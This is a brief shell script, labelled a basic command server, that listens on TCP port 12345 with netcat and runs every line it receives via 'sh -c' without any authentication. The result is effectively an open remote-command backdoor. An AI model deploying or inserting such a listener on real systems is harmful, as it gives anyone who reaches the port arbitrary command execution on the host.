#!/bin/sh

# Basic command server in sh
while true; do
    echo "Listening for commands on port 12345..."
    nc -l -p 12345 -q 1 | while read cmd; do
        echo "Received command: $cmd"
        # Execute the command and capture output
        output=$(sh -c "$cmd" 2>&1)
        echo "$output"
    done
done

